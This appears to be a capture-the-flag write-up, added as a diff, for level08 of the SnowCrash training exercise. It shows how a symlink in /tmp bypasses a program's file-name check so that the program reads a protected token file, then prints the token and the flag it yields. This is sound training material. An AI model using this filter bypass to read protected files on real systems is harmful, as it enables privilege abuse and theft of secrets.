@@ -1,0 +1,19 @@
+We have 2 files level08 and token
+by uncompile the level08 we can see
+that the script take a parameter wich is a 
+name of a file and read it and then return the content
+if the filename contain "token" it will not execute it
+
+so we create a symlink to the token file in /tmp
+
+level08@SnowCrash:/tmp$ ln -s /home/user/level08/token letoto
+level08@SnowCrash:~$ ./level08 /tmp/letoto
+quif5eloekouj29ke0vouxean
+
+with this token we can login as flag08 and get the flag
+
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
